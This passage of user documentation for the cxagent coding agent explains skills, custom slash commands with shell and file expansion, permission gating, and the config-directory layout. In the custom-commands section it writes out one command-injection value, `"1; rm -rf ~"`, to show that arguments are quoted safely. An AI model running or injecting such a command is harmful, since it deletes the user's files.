mean following rules you never granted here. cxagent's own permission gate governs every call a skill
provokes, exactly as if the model had chosen the tool itself.

**Two Claude Code keys are honoured.** `disable-model-invocation: true` keeps a skill out of the
model's list — only you can run it, by typing `/name` — and `/skills` lists it under *You only*.
`user-invocable: false` is the reverse: the model may load it, and it is not offered as a command.

**A skill can ship other files.** Reference documents, templates, examples — anything beside the
`SKILL.md`:

```
.agents/skills/xunit/
  SKILL.md
  manifest.json
  references/
    patterns.md
    anti-patterns.md
```

They are **listed by absolute path when the skill loads**, and the model reads the one it needs with
the ordinary file tool. Not inlined: inlining every reference would hand back the permanent prefix
the catalog/body split exists to avoid, and most references go unread on most tasks. Write the body
to point at them by name — *"see references/anti-patterns.md for what not to do"* — and the model
matches that against the listing.

The same permission gate governs those reads as governs every other one. A **project** skill's files
are inside the working boundary and read without asking; a **global** skill's live in the config
directory, outside it, so they prompt — those files are not part of the repository you are working
in. Twenty files are named before the list is cut short, since the listing rides in the window for
the rest of the session.

**A malformed `SKILL.md` is skipped and reported, never guessed at.** Missing frontmatter, missing
`description`: the skill does not exist as far as the model is concerned, and `/skills` says which
file and why — including files in folders whose other names were shadowed, since a broken file there
is exactly the one nothing else would explain.

**The name comes from the folder.** A `name:` in the frontmatter is checked against it and reported
when it disagrees, never obeyed — otherwise two directories could declare the same skill. A name with a
character a command cannot hold (`dotnet.testing`) still loads for the model; it just cannot be typed,
and `/skills` marks it *not typeable*.

**Re-read every turn.** Edit a skill and it takes effect on the next one, with no restart and no
refresh command. The prompt cache is protected by comparison rather than by caching the read: an
unchanged file renders byte-identical text and the system message is not replaced, so editing one
costs a single prefix — which is what you asked for by editing it.

**Once loaded, a skill stays until the conversation is compacted.** Its body is an ordinary tool
result, so it is re-sent every turn like any other and cannot be unloaded — an unload would leave the
call that fetched it unanswered, which breaks the session outright. When compaction does remove it,
the model is told which skills went and that it may reload them; without that it would keep citing a
document it can no longer read. `/skills` shows what exists; the session panel shows what is
currently in force.

**Links stay inside the repository.** A project skill or skills folder (`.cxagent/skills`, `.agents/skills`)
that is a link pointing outside the repository is not read, and is listed under `/skills` as a problem; a
link to somewhere else in the same repository reads as usual. A skill's file list names only the files
inside its own folder. Your global skills under cxagent's config folder may link anywhere.

---

## Custom commands

A prompt you use often, saved as a file and run by typing its name. `/review 42` sends the file's
text, with `42` filled in, as your message; the model does the work. A Claude Code command file
copied into `.cxagent/commands` works unchanged; `.claude/commands` itself is not read, for the same
reason as its skills.

```markdown
---
description: Review a pull request
argument-hint: [pr-number]
---

Review PR $1. Current diff:

!`gh pr diff $1`

Follow the house style in @CONTRIBUTING.md.
```

**Where they live** — read the same way as skills, nearest first, one file per name:

| Location | Meaning |
|---|---|
| `<repo>/.cxagent/commands/` | This project, addressed to this agent |
| `<config dir>/commands/` | You, wherever you work |

At each level a command file comes before a skill, so `review.md` and a `review` skill side by side
mean the command. The name is the file name; a subfolder (`commands/frontend/component.md`) is only a
label in the palette, and two subfolders at one level holding the same name are both skipped, since
neither is more "the" one. Names use letters, digits, `-` and `_`. **A built-in always wins**: a
repo's `init.md` never changes what `/init` does, and `/commands` lists it as shadowed by the
built-in.

**Frontmatter is optional.** Without it the first line is the description. `description` and
`argument-hint` show in the `/` palette. `allowed-tools` and `model` are ignored and listed as
ignored — the first is another application's permission grant, the second names its models.

**What the file can do:**

- `$ARGUMENTS` is everything after the name; `$1`…`$9` are the words, split as a shell would, quotes
  grouping. A file with neither still gets what you typed, as a last line `ARGUMENTS: …`.
- ``!`command` `` runs before the prompt is sent, with `/bin/sh -c` from the working folder, and its
  output (up to 20 KB) takes its place. **It asks, the way the model's `run_shell` does**: rules, the
  edit mode and the folder's trust decide, and "Always allow" covers it next time. A refused line
  becomes `(not run: refused)`; one still running after 60 seconds is killed. An argument inside a
  shell line is quoted, so `/review "1; rm -rf ~"` reaches `gh` as one harmless word.
- `@path` attaches that file under the prompt, through the same read permission the model's
  `read_file` gets. Something after `@` that is not a file — `@Override`, `@types/node` — stays as
  text.

**Only the file's own text does this.** What you type after the name fills placeholders and nothing
else: `/review @secret.txt` sends the words `@secret.txt`, and a typed `` !`…` `` is never run.

**Typed while a turn runs**, a command waits for it to finish and then runs as its own turn, expanded
then — so ``!`git diff` `` sees what the turn changed. See [COMMANDS.md](COMMANDS.md#commands).

**Headless too.** `cxagent -p "/review 42"` runs the file. With nobody to answer, a shell line runs
only if a rule or the permission mode allows it, and a refusal is listed in `permission_denials`.

**Links stay inside the repository.** A project command file linked to somewhere outside the repository is
not read — it cannot stand in for one of yours of the same name — and is listed under `/skills` as a
problem. A folder link back into a folder above it is reported once, not walked round. Your global
commands may link anywhere.

---

## What else lives in that directory

| File | What it is |
|---|---|
| `config.json` | This file. `0600` once cxagent has written it; see [the top of this page](#configuration) for Windows. |
| `history.db` | Usage history for `/stats`. An archive: append-only, never pruned. `/stats clear` empties it. |
| `logs/<agent-id>/` | Everything about one agent: its session, its context, its transcript, and its logs. A sub-agent's directory nests **inside** its parent's, so the tree mirrors who spawned whom. |
| `CXAGENT.md` | Your global instructions, if you wrote any. |
| `memory/system/<name>.md` | System notes: what the agent keeps about you, read in every folder. Markdown with a `name` and `description` up front; edit or delete them freely. |
| `memory/projects/<folder>-<hash>/` | One project's notes, beside a `path` file naming the folder they belong to. The hash is of the folder's full path, so two folders of one name keep separate notes. |
| `colleagues/<name>/` | One colleague, in a folder named after its first name — a rename changes the record, never the folder: `colleague.json` (who it is, its former names, where it has worked, whether it is frozen, what distilling has cost), `experience/core.md` and one `experience/<codebase>.md` per codebase it knows, `past.jsonl` — every round it worked, word for word, appended and never edited — and `live/`, one mark per session it is live in now. `distilling.lock` beside them lets one process distil at a time. |

### A folder is a session

Each agent's directory holds four kinds of thing:

| File | What it is |
|---|---|
| `session.json` | The header a listing reads — title, folder, token counts, when it last ran. Small on purpose, so `/sessions` never opens a context. |
| `context.json` | The conversation. Read only when something actually resumes or wakes it. |
| `transcript.jsonl` | Scrollback, one line per entry. A line rewritten supersedes the earlier one with the same sequence. |
| `<job-id>.{log,stdout,stderr}` | Per-tool output, as before. |

Deleting one directory removes that conversation completely — which is the point, since a context holds
whatever the agent touched: file contents, command output, a token that appeared in a command. It sits
inside `logs/`, which is `0700` on Linux and macOS.

Cleanly-ended sessions are swept after 30 days. A session you resumed is kept however old: it is the
history behind a conversation that is still going. Deleting `history.db` costs `/stats`.

**Upgrading from a version before this?** `cxagent.db` and `transcript.db` are no longer read. They are
left where they are rather than deleted — remove them if you want the space. An unfinished session from
the older build is not offered for resume.
